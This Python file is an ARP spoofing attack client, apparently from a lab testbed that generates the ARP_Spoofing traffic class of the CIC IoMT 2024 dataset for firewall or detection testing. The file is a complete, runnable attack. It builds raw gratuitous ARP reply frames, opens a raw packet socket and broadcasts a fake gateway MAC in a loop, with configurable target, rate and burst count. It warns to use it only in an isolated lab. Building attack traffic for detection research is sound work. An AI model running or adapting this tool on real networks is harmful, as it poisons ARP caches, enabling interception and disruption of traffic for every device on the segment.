"""
arp_spoof_client.py — ARP spoofing / ARP cache poisoning attack.

Sends gratuitous ARP Reply packets to associate an attacker MAC address with
the gateway's IP, poisoning the ARP cache of devices on the LAN.  This
generates the ARP_Spoofing traffic class from the CIC IoMT 2024 dataset.

Requires root (raw Ethernet socket):
  sudo python attack_clients/arp_spoof_client.py

Note: ARP operates at Layer 2 and is not captured by the default NFQUEUE
iptables rules (which target IP-level traffic).  To detect ARP spoofing,
extend the firewall to also capture ARP, or run a separate ARP monitor.

WARNING: Running this on a real network will disrupt traffic for all devices
on the LAN segment.  Use only in an isolated lab environment.

Environment variables:
  ARP_SPOOF_INTERFACE   Network interface to use (default: eth0)
  ARP_SPOOF_TARGET_IP   Victim IP whose ARP cache we poison (default: GATEWAY_IP)
  ARP_SPOOF_GATEWAY_IP  IP we are claiming to own (default: GATEWAY_IP)
  ARP_SPOOF_FAKE_MAC    Attacker MAC to advertise (default: de:ad:be:ef:00:01)
  ATTACK_RATE_HZ        Packets per second (default: 2)
  ATTACK_BURST_COUNT    Stop after N packets (0 = infinite, default: 0)
  GATEWAY_IP
"""

from __future__ import annotations

import os
import socket
import struct
import sys
import time
from pathlib import Path

from dotenv import load_dotenv

load_dotenv(dotenv_path=Path(__file__).resolve().parents[1] / ".env")

GATEWAY_IP  = os.getenv("GATEWAY_IP", "127.0.0.1")
INTERFACE   = os.getenv("ARP_SPOOF_INTERFACE", "eth0")
TARGET_IP   = os.getenv("ARP_SPOOF_TARGET_IP", GATEWAY_IP)
CLAIM_IP    = os.getenv("ARP_SPOOF_GATEWAY_IP", GATEWAY_IP)
FAKE_MAC    = os.getenv("ARP_SPOOF_FAKE_MAC", "de:ad:be:ef:00:01")
RATE_HZ     = float(os.getenv("ATTACK_RATE_HZ", "2"))
BURST_COUNT = int(os.getenv("ATTACK_BURST_COUNT", "0"))

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


def _mac_to_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))


def _ip_to_bytes(ip: str) -> bytes:
    return socket.inet_aton(ip)


def _build_arp_reply(sender_mac: bytes, sender_ip: bytes,
                     target_mac: bytes, target_ip: bytes) -> bytes:
    """
    Build a raw Ethernet frame containing a gratuitous ARP Reply.

    Ethernet header (14 bytes):
      dst_mac(6) + src_mac(6) + ethertype(2) = 0x0806 (ARP)

    ARP payload (28 bytes):
      htype(2) ptype(2) hlen(1) plen(1) oper(2)
      sha(6) spa(4) tha(6) tpa(4)
    """
    ethertype = b"\x08\x06"                   # ARP
    eth_header = target_mac + sender_mac + ethertype

    htype  = struct.pack("!H", 1)             # Ethernet
    ptype  = struct.pack("!H", 0x0800)        # IPv4
    hlen   = b"\x06"
    plen   = b"\x04"
    oper   = struct.pack("!H", 2)             # Reply

    arp_payload = htype + ptype + hlen + plen + oper \
                + sender_mac + sender_ip \
                + target_mac + target_ip

    return eth_header + arp_payload


def run() -> None:
    print(f"[ARP-SPOOF] Claiming {CLAIM_IP} → {FAKE_MAC}  "
          f"poisoning: {TARGET_IP}  interface: {INTERFACE}")
    print(f"[ARP-SPOOF] Rate: {RATE_HZ:.1f} pkt/s  "
          f"Burst: {'unlimited' if BURST_COUNT == 0 else BURST_COUNT}")
    print("[ARP-SPOOF] WARNING: Only use in an isolated lab environment.")

    fake_mac_bytes  = _mac_to_bytes(FAKE_MAC)
    bcast_mac_bytes = _mac_to_bytes(BROADCAST_MAC)
    claim_ip_bytes  = _ip_to_bytes(CLAIM_IP)
    target_ip_bytes = _ip_to_bytes(TARGET_IP)

    try:
        # ETH_P_ARP = 0x0806; socket.htons converts to network byte order
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                             socket.htons(0x0806))
        sock.bind((INTERFACE, 0))
    except PermissionError:
        print("[ARP-SPOOF] ERROR: raw packet socket requires root. Run with sudo.",
              file=sys.stderr)
        sys.exit(1)
    except OSError as e:
        print(f"[ARP-SPOOF] ERROR: could not open socket on {INTERFACE}: {e}",
              file=sys.stderr)
        print(f"[ARP-SPOOF] Set ARP_SPOOF_INTERFACE to a valid network interface.",
              file=sys.stderr)
        sys.exit(1)

    sleep_s = 1.0 / RATE_HZ if RATE_HZ > 0 else 0
    sent = 0

    # Gratuitous ARP: sender = us (claiming CLAIM_IP), target = broadcast
    frame = _build_arp_reply(
        sender_mac=fake_mac_bytes,
        sender_ip=claim_ip_bytes,
        target_mac=bcast_mac_bytes,
        target_ip=target_ip_bytes,
    )

    try:
        while True:
            try:
                sock.send(frame)
            except OSError as e:
                print(f"[ARP-SPOOF] send error: {e}", file=sys.stderr)
                time.sleep(0.5)
                continue

            sent += 1
            if sent % 50 == 0:
                print(f"[ARP-SPOOF] Sent {sent} gratuitous ARP replies")

            if BURST_COUNT > 0 and sent >= BURST_COUNT:
                print(f"[ARP-SPOOF] Burst limit reached ({sent} packets).")
                break

            if sleep_s:
                time.sleep(sleep_s)

    except KeyboardInterrupt:
        print(f"\n[ARP-SPOOF] Stopped after {sent} packets.")
    finally:
        sock.close()


if __name__ == "__main__":
    run()
